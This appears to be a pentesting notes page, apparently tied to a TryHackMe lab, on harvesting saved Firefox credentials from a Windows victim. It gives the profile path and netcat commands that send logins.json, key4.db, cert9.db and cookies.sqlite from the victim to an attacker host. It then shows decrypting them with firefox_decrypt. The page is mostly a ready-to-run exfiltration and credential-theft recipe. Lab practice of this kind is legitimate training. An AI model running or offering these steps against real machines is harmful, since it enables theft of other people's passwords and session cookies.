# Credential Harvesting

## Browsers

### **Firefox**

**Common Areas**

| Location                                                   | Notes                                                                                                                                                      | Example    |
| ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- |
| C:\Users\\$USER\AppData\Roaming\Mozilla\Firefox\Profiles\\ | <p>Depending on the version of Firefox there will be a folder with the files you need.<br><strong>ex:</strong> ljfn812a.default-release = Firefox 75.0</p> | Gatekeeper |
|                                                            |                                                                                                                                                            |            |
|                                                            |                                                                                                                                                            |            |
|                                                            |                                                                                                                                                            |            |

**Exploit**

{% embed url="https://github.com/unode/firefox_decrypt" %}

#### Decrypt Credentials

**Examples**

[gatekeeper.md](../../walkthroughs/tryhackme/gatekeeper.md "mention")

**Kali**&#x20;

We need to transfer the following files one by one.

```
nc -nlvp 1234 > logins.json
nc -nlvp 1234 > key4.db 
nc -nlvp 1234 > cert9.db 
nc -nlvp 1234 > cookies.sqlite
```

**Victim**

```
nc64.exe -nv $KALI 1234 < logins.json
nc64.exe -nv $KALI 1234 < key4.db 
nc64.exe -nv $KALI 1234 < cert9.db 
nc64.exe -nv $KALI 1234 < cookies.sqlite
```

This will show any passwords saved in Firefox

**Kali**&#x20;

```
git clone https://github.com/unode/firefox_decrypt.git
python3.9 firefox_decrypt.py ./
```
